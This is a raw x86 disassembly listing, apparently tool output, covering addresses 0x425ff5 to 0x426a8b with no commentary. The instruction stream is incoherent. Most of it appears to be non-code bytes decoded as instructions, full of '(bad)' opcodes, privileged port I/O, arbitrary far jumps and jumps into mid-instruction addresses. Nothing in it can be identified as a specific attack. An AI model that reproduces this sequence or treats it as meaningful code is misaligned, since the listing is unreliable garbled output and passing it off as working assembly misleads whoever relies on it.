  425ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ff7:	iret   
  425ff8:	push   0x7c4c6d08
  425ffd:	sub    DWORD PTR [edi-0x5bcfe529],eax
  426003:	dec    ebp
  426004:	out    dx,eax
  426005:	repnz push cs
  426007:	push   edx
  426008:	fcomip st,st(0)
  42600a:	popa   
  42600b:	inc    ecx
  42600c:	ins    BYTE PTR es:[edi],dx
  42600d:	(bad)  
  42600f:	lock (bad) 
  426012:	(bad)  
  426013:	je     0x426054
  426015:	fs jno 0x426038
  426018:	mov    ebp,eax
  42601a:	jmp    0x425fc2
  42601c:	test   edx,0x118cfe84
  426022:	repnz xor DWORD PTR [ecx+esi*1],0x85f31231
  42602a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42602b:	and    edx,ecx
  42602d:	push   cs
  42602e:	test   BYTE PTR [edx-0x30],dh
  426031:	inc    edx
  426032:	retf   
  426033:	push   esi
  426034:	add    eax,0xed84fb02
  426039:	xor    BYTE PTR [edx-0x7a],dh
  42603c:	pop    esi
  42603d:	or     eax,DWORD PTR [ebx+0xcef60f]
	...
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x1374892d
  4260c4:	xchg   bp,ax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	test   BYTE PTR [eax],0x0
  4260cb:	add    BYTE PTR [ecx-0x6e],al
  4260ce:	test   BYTE PTR [edi],0x82
  4260d1:	ret    0x2f9b
  4260d4:	xchg   ebp,ecx
  4260d6:	mov    dh,0x5f
  4260d8:	out    0x8d,al
  4260da:	cmp    ebx,DWORD PTR [edi]
  4260dc:	mov    WORD PTR ds:0xb58a2b6e,?
  4260e2:	mov    eax,DWORD PTR [ecx]
  4260e4:	addr16 push ebx
  4260e6:	mov    ah,0xb5
  4260e8:	jnp    0x42609e
  4260ea:	xor    DWORD PTR [ebx+0x583a8173],esi
  4260f0:	aam    0x73
  4260f2:	sbb    al,0x37
  4260f4:	in     al,0x63
  4260f6:	xchg   ecx,eax
  4260f7:	aam    0x21
  4260f9:	mov    eax,0xba89e6ec
  4260fe:	xchg   esp,eax
  4260ff:	pop    esi
  426100:	ss addr16 ret 0x4957
  426105:	inc    esp
  426106:	in     al,dx
  426107:	lods   al,BYTE PTR ds:[esi]
  426108:	mov    cl,0x40
  42610a:	out    0x2e,eax
  42610c:	pop    ecx
  42610d:	addr16 int3 
  42610f:	mov    cl,BYTE PTR [eax+0x60]
  426112:	sub    ah,BYTE PTR [ecx-0x2481e77f]
  426118:	ror    DWORD PTR [ebp+edx*1+0xd],1
  42611c:	xchg   BYTE PTR [ebp+0x6856c96b],bl
  426122:	and    eax,0xbf0d580e
  426127:	lea    ecx,[edx+0x2f089a4e]
  42612d:	ret    
  42612e:	dec    edi
  42612f:	sub    cl,bl
  426131:	adc    bh,dh
  426133:	psubb  mm1,QWORD PTR [esi]
  426136:	mov    ss,WORD PTR [ebx+0x75d9b474]
  42613c:	push   edi
  42613d:	push   es
  42613e:	jmp    0x4260e5
  426140:	adc    eax,0xc7240865
  426145:	xchg   esp,eax
  426146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426147:	mov    esp,DWORD PTR [esi-0x80]
  42614a:	and    DWORD PTR [ebx+eax*4],ecx
  42614d:	push   esi
  42614e:	pop    ebp
  42614f:	dec    eax
  426150:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  426152:	nop
  426153:	(bad)  
  426154:	pop    esi
  426155:	mov    ds:0x9d56ebf,eax
  42615a:	test   DWORD PTR [esi],ebp
  42615c:	or     BYTE PTR [edi+0x51],ch
  42615f:	ret    0x5545
  426162:	adc    DWORD PTR [esp+ecx*2-0x7f],ebp
  426166:	cmp    esp,DWORD PTR es:[edx]
  426169:	into   
  42616a:	cmp    eax,0xf023f971
  42616f:	xlat   BYTE PTR ds:[ebx]
  426170:	outs   dx,BYTE PTR ds:[esi]
  426171:	mov    ebx,0x4926ce48
  426176:	sti    
  426177:	mov    edi,0x3564275
  42617c:	(bad)  
  42617d:	jo     0x4261ad
  42617f:	xchg   edx,eax
  426180:	sbb    DWORD PTR [edi+0x6e6b78ec],ecx
  426186:	sub    BYTE PTR [ebx],al
  426188:	je     0x426177
  42618a:	add    eax,0x89426232
  42618f:	push   ds
  426190:	sub    bh,0x55
  426193:	mov    bh,0xc9
  426195:	fiadd  WORD PTR [ebx]
  426197:	jmp    0x37bf:0x85dfd41e
  42619e:	pop    edi
  42619f:	cld    
  4261a0:	retf   
  4261a1:	shr    DWORD PTR [ebx+0x12aa1959],cl
  4261a7:	pop    esi
  4261a8:	inc    edx
  4261a9:	popa   
  4261aa:	ret    
  4261ab:	or     eax,0xa6c79fc
  4261b0:	mov    BYTE PTR [eax+0x68],ah
  4261b3:	cmp    al,0x40
  4261b5:	jnp    0x426193
  4261b7:	xchg   edx,eax
  4261b8:	push   ds
  4261b9:	fadd   QWORD PTR [edi-0x5f034d67]
  4261bf:	add    BYTE PTR [esi+0x4e],bh
	...
  426232:	add    BYTE PTR [eax],al
  426234:	lods   al,BYTE PTR ds:[esi]
  426235:	les    esi,FWORD PTR [ebx-0x32]
  426238:	jnp    0x426239
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x43
  426241:	clc    
  426242:	add    BYTE PTR [esp+ebx*2-0x6a],dh
  426246:	add    DWORD PTR [eax],eax
  426248:	test   BYTE PTR [eax],0x0
  42624b:	add    ah,dl
  42624d:	mov    eax,0x7887f79f
  426252:	pop    eax
  426253:	push   ss
  426254:	das    
  426255:	fldpi  
  426257:	shl    dh,0x5d
  42625a:	stos   BYTE PTR es:[edi],al
  42625b:	sahf   
  42625c:	ja     0x426235
  42625e:	out    0x15,eax
  426260:	or     ch,BYTE PTR [edi-0x14f5cf25]
  426266:	scas   al,BYTE PTR es:[edi]
  426267:	mul    DWORD PTR [edi-0x79]
  42626a:	add    esp,DWORD PTR [edx-0x2288c191]
  426270:	pop    esi
  426271:	pop    DWORD PTR [ecx]
  426273:	std    
  426274:	aam    0x24
  426276:	call   0x633664a7
  42627b:	jge    0x4262a8
  42627d:	pop    edi
  42627e:	aas    
  42627f:	lahf   
  426280:	pop    ds
  426281:	add    BYTE PTR [ecx+ebp*2-0x8b0f1f6],cl
  426288:	mov    eax,ebx
  42628a:	ds (bad) 
  42628c:	sbb    ebp,DWORD PTR [ecx+0x3]
  42628f:	fist   WORD PTR [esi+0xd6af734]
  426295:	pop    ds
  426296:	sbb    BYTE PTR [edx],0x97
  426299:	int3   
  42629a:	jo     0x426249
  42629c:	sbb    eax,0x994fb9ab
  4262a1:	rcr    BYTE PTR ds:0xe0e5da32,0xe2
  4262a8:	lds    esi,FWORD PTR [edi+0x3874b900]
  4262ae:	sub    dl,BYTE PTR [edi]
  4262b0:	ret    0xfdfd
  4262b3:	loop   0x4262be
  4262b5:	push   cs
  4262b6:	arpl   WORD PTR [ebx],si
  4262b8:	out    0x20,eax
  4262ba:	add    eax,0x521aec3
  4262bf:	jo     0x42628b
  4262c1:	mov    esi,DWORD PTR [esi+eax*8+0x296e790]
  4262c8:	add    esp,edx
  4262ca:	mov    DWORD PTR [ecx-0x4a],esi
  4262cd:	out    dx,al
  4262ce:	test   BYTE PTR [edi+ebx*4-0x63],0x70
  4262d3:	or     DWORD PTR [edi],ebp
  4262d5:	adc    ah,al
  4262d7:	adc    al,0x5
  4262d9:	test   DWORD PTR [ebx+0x2c73eb8e],esi
  4262df:	(bad)  
  4262e1:	push   cs
  4262e2:	stc    
  4262e3:	cmp    BYTE PTR [edx+esi*8+0x70],bh
  4262e7:	cli    
  4262e8:	mov    al,ds:0x82521095
  4262ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262ee:	sbb    DWORD PTR [ebp+ebp*1+0xe],ebp
  4262f2:	sbb    al,0xf9
  4262f4:	mov    edi,0x1db33990
  4262f9:	in     eax,0x62
  4262fb:	xor    eax,0x73a8553e
  426300:	dec    edi
  426301:	inc    esp
  426302:	clc    
  426303:	push   esp
  426305:	div    DWORD PTR [edi+0x1f297cbe]
  42630b:	jno    0x42630a
  42630d:	mov    esi,0x50d30f2e
  426312:	mov    edi,0xe06b0ce0
  426317:	add    ah,bl
  426319:	ret    
  42631a:	push   edx
  42631b:	sahf   
  42631c:	sub    DWORD PTR es:[edx],eax
  42631f:	inc    ecx
  426320:	pop    edx
  426321:	repnz das 
  426323:	inc    ebx
  426324:	fist   DWORD PTR es:[ecx+0x7f1d17b4]
  42632b:	scas   al,BYTE PTR es:[edi]
  42632c:	adc    ch,BYTE PTR [ebx-0x40191a6b]
  426332:	sub    DWORD PTR [edx],edx
  426334:	jo     0x4262cf
  426336:	cwde   
  426337:	inc    esi
  426338:	pop    edi
  426339:	and    ch,cl
  42633b:	add    al,0xf3
  42633d:	dec    ecx
  42633e:	mov    ah,0x95
  426340:	dec    ecx
  426341:	mov    bh,0x0
	...
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	shl    BYTE PTR [esi],1
  4263c2:	in     al,dx
  4263c3:	sti    
  4263c4:	push   edx
  4263c5:	xchg   edi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	test   BYTE PTR [eax],0x0
  4263cb:	add    BYTE PTR [ecx+0x370e2cb0],ch
  4263d1:	adc    DWORD PTR [edx+0xabc7d23],0xffffff9d
  4263d8:	jmp    0x91ee5e30
  4263dd:	(bad)  
  4263de:	fdiv   QWORD PTR [edi+0x4e]
  4263e1:	stos   DWORD PTR es:[edi],eax
  4263e2:	mov    ebp,esi
  4263e4:	mov    esi,DWORD PTR [eax+0x51c7b3cb]
  4263ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263eb:	dec    edx
  4263ec:	cmp    DWORD PTR [ebp-0x4a7a4196],eax
  4263f2:	mov    eax,0x5bc6a3cc
  4263f7:	stos   DWORD PTR es:[edi],eax
  4263f8:	call   0xb92d:0x79425cb0
  4263ff:	or     BYTE PTR [ecx-0x58952fc7],dh
  426405:	dec    BYTE PTR ds:0x4d8b4b32
  42640b:	cwde   
  42640c:	inc    edx
  42640d:	dec    ecx
  42640f:	mov    DWORD PTR ss:[edi],eax
  426412:	pop    edi
  426413:	or     DWORD PTR [ebx+0x2b],0x11cf84fc
  42641a:	sbb    al,0xe4
  42641c:	push   edi
  42641d:	(bad)  
  42641e:	cmp    eax,0xece61569
  426423:	iret   
  426424:	jge    0x4263dc
  426426:	lea    edi,[edi+0x48]
  426429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42642a:	stos   BYTE PTR es:[edi],al
  42642b:	(bad)  
  42642d:	pusha  
  42642e:	or     DWORD PTR [edx+0x40],ebp
  426431:	mov    dh,0xc0
  426433:	or     cl,BYTE PTR [esp+esi*4]
  426436:	imul   ebp,edx,0x83e2773c
  42643c:	fadd   QWORD PTR [eax+0x7784fb72]
  426442:	jo     0x426427
  426444:	dec    ecx
  426445:	arpl   WORD PTR [ebx+0x2bb6fb7b],di
  42644b:	ja     0x426469
  42644d:	push   eax
  42644e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42644f:	jne    0x42645a
  426451:	add    al,0x36
  426453:	cmp    DWORD PTR [edx+0x7f6f48ea],eax
  426459:	into   
  42645a:	xchg   esi,eax
  42645b:	xor    edi,esp
  42645d:	jle    0x42648a
  42645f:	jl     0x42642d
  426461:	mov    bl,0xfc
  426463:	lods   eax,DWORD PTR ds:[esi]
  426464:	das    
  426465:	gs test ch,dl
  426468:	(bad)  fs:[ebp+0x3e99e14]
  42646f:	jg     0x4264c4
  426471:	xor    DWORD PTR [edi],0x5
  426474:	scas   eax,DWORD PTR es:[edi]
  426475:	mov    al,ds:0xc5bb2a65
  42647a:	xchg   ecx,eax
  42647b:	sub    DWORD PTR [edx+0x4d],ebx
  42647e:	jecxz  0x426411
  426480:	pop    ecx
  426481:	pop    eax
  426482:	lds    ebx,FWORD PTR [esi+0x73]
  426485:	iret   
  426486:	das    
  426487:	push   0x248248eb
  42648c:	and    edx,ebx
  42648e:	xor    al,0xfb
  426490:	mov    ebp,0xc5c375c2
  426495:	test   al,0xa8
  426497:	push   esp
  426498:	xor    DWORD PTR [ebx+0x56a586aa],0x14
  42649f:	push   0xffffff85
  4264a1:	mov    ebx,0x77de0fa9
  4264a6:	fs mov cl,0x90
  4264a9:	push   ds
  4264aa:	dec    ecx
  4264ab:	cmp    BYTE PTR ss:[esi+0x5e2c2c4],cl
  4264b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264b3:	pop    edx
  4264b4:	sub    BYTE PTR [ebx-0x17],cl
  4264b7:	inc    esp
  4264b8:	inc    ebx
  4264b9:	push   ebx
  4264ba:	fs inc ebp
  4264bc:	xchg   edx,eax
  4264bd:	mov    dl,0x5d
  4264bf:	jmp    DWORD PTR [edx]
  4264c1:	arpl   WORD PTR [eax],ax
	...
  426533:	add    ah,al
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	adc    BYTE PTR [ebp-0x67b78f06],0x1
  426547:	add    dh,dh
  426549:	add    BYTE PTR [eax],al
  42654b:	add    BYTE PTR [ecx+0x4d7a51f6],dl
  426551:	cli    
  426552:	push   ecx
  426553:	dec    eax
  426554:	loope  0x4264ff
  426556:	inc    ebp
  426557:	mov    WORD PTR [ebx],cs
  426559:	and    cl,al
  42655b:	mov    eax,0x7a5bb183
  426560:	(bad)  
  426563:	fidiv  DWORD PTR [ecx]
  426565:	push   es
  426566:	xchg   ebx,eax
  426567:	lea    ebp,[edi+0x77971fc1]
  42656d:	out    0x3,eax
  42656f:	adc    BYTE PTR [eax],al
  426571:	cli    
  426572:	test   dl,ch
  426574:	pop    esp
  426575:	sub    ecx,DWORD PTR [eax-0x45]
  426578:	into   
  426579:	inc    edi
  42657a:	inc    ebx
  42657b:	shl    BYTE PTR ss:[ebx],1
  42657e:	xchg   esi,eax
  42657f:	enter  0x4e7a,0xbc
  426583:	add    eax,0xa706f7c3
  426588:	sub    al,0xf7
  42658a:	add    bh,bl
  42658c:	mov    BYTE PTR [edi+0x22],dh
  42658f:	jno    0x426602
  426591:	ins    BYTE PTR es:[edi],dx
  426592:	sbb    eax,0x25b2272f
  426597:	inc    ebp
  426598:	rol    BYTE PTR [edx+0x7f],cl
  42659b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42659c:	mov    ah,0x5b
  42659e:	xlat   BYTE PTR ds:[ebx]
  42659f:	dec    edi
  4265a0:	scas   eax,DWORD PTR es:[edi]
  4265a1:	push   ebp
  4265a2:	iret   
  4265a3:	sbb    ecx,DWORD PTR ds:0x7c558b57
  4265a9:	aam    0x77
  4265ab:	xor    DWORD PTR [edi],0x3f675089
  4265b1:	cld    
  4265b2:	idiv   BYTE PTR [eax]
  4265b4:	add    dl,cl
  4265b6:	sub    BYTE PTR [ecx],al
  4265b8:	cmp    DWORD PTR [esi],0xffffffda
  4265bb:	push   es
  4265bc:	pop    ecx
  4265bd:	repnz push eax
  4265bf:	sti    
  4265c0:	pop    esi
  4265c1:	out    0x72,eax
  4265c3:	push   esp
  4265c4:	xchg   ecx,eax
  4265c5:	cmp    DWORD PTR [ebp+ebx*2-0x3a],eax
  4265c9:	retf   
  4265ca:	out    0x41,eax
  4265cc:	fwait
  4265cd:	mov    bh,0x42
  4265cf:	cmp    BYTE PTR [edx+0x1b],bh
  4265d2:	das    
  4265d3:	xor    eax,DWORD PTR [ecx]
  4265d5:	mov    cs,WORD PTR [eax]
  4265d7:	cmp    DWORD PTR ds:0x43e6ab1d,esi
  4265dd:	sahf   
  4265de:	fnstenv [esi-0x5]
  4265e1:	jg     0x426596
  4265e3:	out    dx,al
  4265e4:	and    eax,0x2426ba51
  4265e9:	out    dx,eax
  4265ea:	dec    ecx
  4265eb:	loop   0x4265d4
  4265ed:	icebp  
  4265ee:	jg     0x426577
  4265f0:	jl     0x42664c
  4265f2:	cmp    esp,DWORD PTR cs:[esi]
  4265f5:	dec    esi
  4265f6:	cli    
  4265f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265f8:	pop    ss
  4265f9:	push   0x76
  4265fb:	mov    dh,BYTE PTR [eax-0x69]
  4265fe:	lods   eax,DWORD PTR ds:[esi]
  4265ff:	cmp    dh,0x3c
  426602:	mov    eax,0xe9e620f
  426607:	in     eax,dx
  426608:	mov    ecx,0xeb7c8cca
  42660d:	sub    eax,0x11cb6d1b
  426612:	scas   al,BYTE PTR es:[edi]
  426613:	aaa    
  426614:	jg     0x42660a
  426616:	push   0x64
  426618:	(bad)  
  42661a:	rcr    BYTE PTR [ecx+0x69],cl
  42661d:	popa   
  42661e:	ss rcr esi,0x6
  426622:	xor    al,0x12
  426624:	and    BYTE PTR es:[edi-0x58],bl
  426628:	test   eax,0x70824ba8
  42662d:	pop    esp
  42662e:	retf   
  42662f:	or     dh,al
  426631:	repz jmp 0x4109:0x871236e0
  426639:	push   ebx
  42663a:	test   DWORD PTR [ecx+0x66],edx
  42663d:	scas   al,BYTE PTR es:[edi]
  42663e:	xchg   ebp,eax
  42663f:	es xor ebx,0x0
	...
  4266b2:	add    BYTE PTR [eax],al
  4266b4:	(bad)  
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	inc    edi
  4266c1:	lods   al,BYTE PTR ds:[esi]
  4266c2:	fwait
  4266c3:	sbb    edi,DWORD PTR [esi]
  4266c5:	cdq    
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	test   BYTE PTR [eax],0x0
  4266cb:	add    BYTE PTR [edi+0x3b],dh
  4266ce:	sub    eax,DWORD PTR [edi+0x33]
  4266d1:	fsin   
  4266d3:	sub    edx,DWORD PTR [ecx-0xd]
  4266d6:	out    0x57,eax
  4266d8:	jns    0x426677
  4266da:	inc    edx
  4266db:	xor    BYTE PTR [eax-0x1cb6adb4],cl
  4266e1:	fucomip st,st(5)
  4266e3:	addr16 dec ebp
  4266e5:	add    esi,DWORD PTR [ebx]
  4266e7:	xor    dh,bh
  4266e9:	push   esi
  4266ea:	idiv   BYTE PTR [ecx]
  4266ec:	aad    0x42
  4266ee:	aad    0x8b
  4266f0:	xchg   BYTE PTR [ecx],bh
  4266f2:	inc    ebp
  4266f3:	div    DWORD PTR [esi-0x2c]
  4266f6:	adc    edx,ebx
  4266f8:	out    dx,eax
  4266f9:	jmp    0x2fcd:0xb7c37642
  426700:	out    dx,eax
  426701:	neg    eax
  426703:	add    al,0x9c
  426705:	fwait
  426706:	xlat   BYTE PTR ds:[ebx]
  426707:	inc    ecx
  426708:	mov    cl,0x97
  42670a:	jmp    0xe385:0x82a2cf8d
  426711:	out    dx,al
  426712:	arpl   WORD PTR [esi+0x2d49dc2c],bx
  426718:	loop   0x426725
  42671a:	sub    BYTE PTR [eax],bl
  42671c:	add    al,0x2d
  42671e:	repnz adc dh,BYTE PTR [edi+0x485ceabe]
  426725:	push   eax
  426726:	out    dx,al
  426727:	and    DWORD PTR [edi],ebx
  426729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42672a:	mov    ebp,0xae720d7b
  42672f:	loopne 0x4266ba
  426731:	add    esi,ebp
  426733:	dec    esp
  426734:	pop    esi
  426735:	(bad)  
  426736:	call   0x40347b90
  42673b:	into   
  42673c:	adc    BYTE PTR [ecx],al
  42673e:	out    dx,eax
  42673f:	cwde   
  426740:	inc    ebx
  426741:	cld    
  426742:	fsub   st(1),st
  426744:	shr    DWORD PTR [edx],1
  426746:	lahf   
  426747:	scas   al,BYTE PTR es:[edi]
  426748:	or     dl,BYTE PTR [ebx-0x5a7cb27b]
  42674e:	pop    ecx
  42674f:	xchg   BYTE PTR [edi+0x34],ah
  426752:	jecxz  0x42679c
  426754:	jnp    0x426757
  426756:	popf   
  426757:	xchg   ebp,eax
  426758:	nop
  426759:	pop    ss
  42675a:	lds    edx,FWORD PTR [edi]
  42675c:	adc    ecx,DWORD PTR [esi+0x3161e06a]
  426762:	mov    dh,0x45
  426764:	sbb    ebx,DWORD PTR [edx]
  426766:	cdq    
  426767:	mov    al,ds:0xfb81195
  42676c:	jae    0x426780
  42676e:	mul    DWORD PTR [eax-0x74efa862]
  426774:	lods   al,BYTE PTR ds:[esi]
  426775:	popa   
  426776:	loopne 0x4267d1
  426778:	dec    ecx
  426779:	loopne 0x42679a
  42677b:	xchg   ecx,eax
  42677c:	outs   dx,DWORD PTR ds:[esi]
  42677d:	xchg   edx,eax
  42677e:	gs xor eax,0xda5bc2bf
  426784:	icebp  
  426785:	xchg   edi,eax
  426786:	push   cs
  426787:	neg    DWORD PTR [edx-0x4f54dc85]
  42678d:	(bad)  
  42678e:	loopne 0x426761
  426790:	icebp  
  426791:	push   ebp
  426792:	stos   DWORD PTR es:[edi],eax
  426793:	cmp    cl,al
  426795:	mov    ah,0x2a
  426797:	out    dx,al
  426798:	addr16 or al,cl
  42679b:	and    al,0xa7
  42679d:	fdivr  st,st(4)
  42679f:	popa   
  4267a0:	daa    
  4267a1:	inc    edx
  4267a2:	int3   
  4267a3:	mov    dl,0x8f
  4267a5:	adc    al,0x9f
  4267a7:	push   0xffffffca
  4267a9:	xchg   ecx,eax
  4267aa:	ror    BYTE PTR [ebx+ecx*2],1
  4267ad:	fisttp QWORD PTR [eax+ebp*2]
  4267b0:	mov    ecx,0xa90746f0
  4267b5:	xchg   edx,eax
  4267b6:	frstor [ebp-0x715487a8]
  4267bc:	pop    edi
  4267bd:	sbb    BYTE PTR [edi+ecx*2],ch
  4267c0:	lods   eax,DWORD PTR ds:[esi]
  4267c1:	mov    eax,0x0
	...
  426832:	add    BYTE PTR [eax],al
  426834:	pop    esp
  426835:	push   edx
  426836:	nop
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x45452734],cl
  426843:	scas   al,BYTE PTR es:[edi]
  426844:	xor    al,0x9a
  426846:	add    DWORD PTR [eax],eax
  426848:	test   BYTE PTR [eax],0x0
  42684b:	add    BYTE PTR [esi],bh
  42684d:	cdq    
  42684e:	mov    al,0x5a
  426850:	loope  0x4267e3
  426852:	(bad)  
  426853:	xor    ch,BYTE PTR [edi]
  426855:	cs xor al,0xb1
  426858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426859:	cmp    eax,0x9b884467
  42685e:	out    0xae,al
  426860:	(bad)  
  426861:	mov    ah,0x5f
  426863:	mov    ebx,0x846bca4f
  426868:	adc    ch,BYTE PTR [edx+0x5b]
  42686b:	add    BYTE PTR [ebp+0x35],cl
  42686e:	xchg   esp,eax
  42686f:	mov    es,esp
  426871:	add    dh,dh
  426873:	out    dx,eax
  426874:	ins    DWORD PTR es:[edi],dx
  426875:	mov    ch,ah
  426877:	dec    esi
  426878:	loop   0x426883
  42687a:	mov    edx,0x30c3d10a
  42687f:	mov    BYTE PTR [ecx-0x2ee17c27],al
  426885:	fisub  WORD PTR [eax-0x58]
  426888:	xlat   BYTE PTR ds:[ebx]
  426889:	outs   dx,BYTE PTR ds:[esi]
  42688a:	mov    bh,0x2b
  42688c:	push   ss
  42688d:	or     eax,0x89df92e8
  426892:	jns    0x4268e6
  426894:	mov    ecx,0xa7ef11f8
  426899:	sbb    DWORD PTR [ebx+ebp*2-0x48137f96],esi
  4268a0:	in     eax,dx
  4268a1:	sbb    eax,0xad6c6f01
  4268a6:	push   edi
  4268a7:	loop   0x42686b
  4268a9:	test   al,0xdb
  4268ab:	neg    ebp
  4268ad:	fisttp DWORD PTR [edi]
  4268af:	or     al,0x69
  4268b1:	sbb    ebp,DWORD PTR [edi+0x7f]
  4268b4:	adc    al,0x54
  4268b6:	in     eax,0xd9
  4268b8:	mov    esi,0x35267539
  4268bd:	or     al,BYTE PTR [ebx+ebx*1-0x3]
  4268c1:	push   0x22dc5767
  4268c6:	stos   BYTE PTR es:[edi],al
  4268c7:	xor    esi,DWORD PTR [eax+ebp*4-0x1d]
  4268cb:	cli    
  4268cc:	jne    0x4268d6
  4268ce:	mov    WORD PTR [ecx],fs
  4268d0:	sbb    ebp,edx
  4268d2:	loopne 0x4268d1
  4268d4:	inc    edx
  4268d5:	sub    BYTE PTR [edx],ah
  4268d7:	sbb    eax,0x796256b9
  4268dc:	dec    edi
  4268dd:	into   
  4268de:	mov    WORD PTR [edx],gs
  4268e0:	mov    bl,0x7a
  4268e2:	retf   0x6f9a
  4268e5:	js     0x42687e
  4268e7:	add    DWORD PTR [esi-0xdc8eb8f],esp
  4268ed:	jnp    0x42689d
  4268ef:	mov    ch,0x1
  4268f1:	sbb    al,0x8c
  4268f3:	neg    cl
  4268f5:	jp     0x42695d
  4268f7:	rcr    DWORD PTR [edi],0xdf
  4268fa:	fcomp  QWORD PTR [ecx+0xd51f65a]
  426900:	dec    ebp
  426901:	sub    bl,BYTE PTR [ecx-0x3a]
  426904:	mov    esp,0x5b3c3ba
  426909:	retf   
  42690a:	pop    ebx
  42690b:	fiadd  WORD PTR [ecx-0x5bf8e5b6]
  426911:	cmp    eax,esp
  426913:	dec    ecx
  426914:	ins    BYTE PTR es:[edi],dx
  426915:	sbb    esp,DWORD PTR [ebp+0x7b]
  426918:	js     0x4268c4
  42691a:	push   ds
  42691b:	jmp    0x747d:0xf11a5c81
  426922:	(bad)  
  426923:	daa    
  426924:	pop    edi
  426925:	push   eax
  426926:	scas   al,BYTE PTR es:[edi]
  426927:	hlt    
  426928:	ffree  st(2)
  42692a:	inc    ebp
  42692b:	pop    esp
  42692c:	dec    BYTE PTR [ebx+0x7b5a60e2]
  426932:	loop   0x426957
  426934:	inc    ebx
  426935:	add    eax,DWORD PTR [edi]
  426937:	inc    esp
  426938:	mov    ebx,ds
  42693a:	pop    esp
  42693b:	push   edx
  42693c:	pop    ds
  42693d:	repz int 0xcf
  426940:	xchg   ebp,eax
  426941:	xor    al,BYTE PTR [eax]
	...
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	or     eax,0x2a29df57
  4269c5:	fwait
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	test   BYTE PTR [eax],0x0
  4269cb:	add    BYTE PTR [ecx+esi*4],cl
  4269ce:	pop    eax
  4269cf:	out    0x4c,al
  4269d1:	jnp    0x42699b
  4269d3:	sti    
  4269d4:	pop    ecx
  4269d5:	cmp    eax,0x71ddc2f0
  4269da:	mov    esp,0x6d1c98d0
  4269df:	mov    ecx,0x278f5aac
  4269e4:	mov    BYTE PTR [ecx-0x170e774a],bh
  4269ea:	hlt    
  4269eb:	aam    0x64
  4269ed:	shl    BYTE PTR [esi-0x1818aaed],0xe7
  4269f4:	xlat   BYTE PTR ds:[ebx]
  4269f5:	repnz inc ecx
  4269f7:	sti    
  4269f8:	pop    es
  4269f9:	outs   dx,DWORD PTR ds:[esi]
  4269fa:	or     BYTE PTR [ebp-0x3],ch
  4269fd:	popa   
  4269fe:	lds    ecx,FWORD PTR [ecx]
  426a00:	jb     0x426a49
  426a02:	mov    dh,0x46
  426a04:	mov    fs,esp
  426a06:	push   esp
  426a07:	shl    BYTE PTR [ecx-0xe],cl
  426a0a:	add    al,0x57
  426a0c:	jmp    0x59a1d730
  426a11:	push   cs
  426a12:	and    al,0xa
  426a14:	je     0x42699f
  426a16:	ss je  0x426a98
  426a19:	fld    QWORD PTR [ebx+0x7a]
  426a1c:	popf   
  426a1d:	cwde   
  426a1e:	int3   
  426a1f:	mov    DWORD PTR [edi-0x36],0xd9fa3b3b
  426a26:	xchg   edx,eax
  426a27:	pop    ecx
  426a28:	and    eax,0xd92c4942
  426a2d:	les    esp,FWORD PTR [ecx+ebp*8-0x66549ccb]
  426a34:	inc    ebx
  426a35:	cwde   
  426a36:	in     al,dx
  426a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a38:	stos   BYTE PTR es:[edi],al
  426a39:	push   esp
  426a3a:	dec    ebp
  426a3b:	jl     0x426a4e
  426a3d:	test   ebp,esi
  426a3f:	repz pop esp
  426a41:	in     al,dx
  426a42:	add    dh,al
  426a44:	xor    al,0x8f
  426a46:	and    edx,DWORD PTR [ebp+0x205e64eb]
  426a4c:	imul   ecx,DWORD PTR [edx+esi*2+0x36b00dc4],0x62867d70
  426a57:	das    
  426a58:	xchg   BYTE PTR [edx+0x4750a774],al
  426a5e:	and    DWORD PTR [ecx+0x70862855],esp
  426a64:	dec    esi
  426a65:	add    BYTE PTR [ecx],cl
  426a67:	bound  esp,QWORD PTR [ecx-0x2d3d435c]
  426a6d:	jmp    0xbe3e:0xe71c0c9b
  426a74:	daa    
  426a75:	out    0x25,eax
  426a77:	(bad)  
  426a78:	push   DWORD PTR [edi]
  426a7a:	add    al,0xa0
  426a7c:	mov    ecx,0x55e3e29d
  426a81:	test   al,0x7e
  426a83:	cwde   
  426a84:	cmp    edi,eax
  426a86:	sub    al,0xfa
  426a88:	into   
  426a89:	xor    al,0x75
  426a8b:	test   ecx,ebp
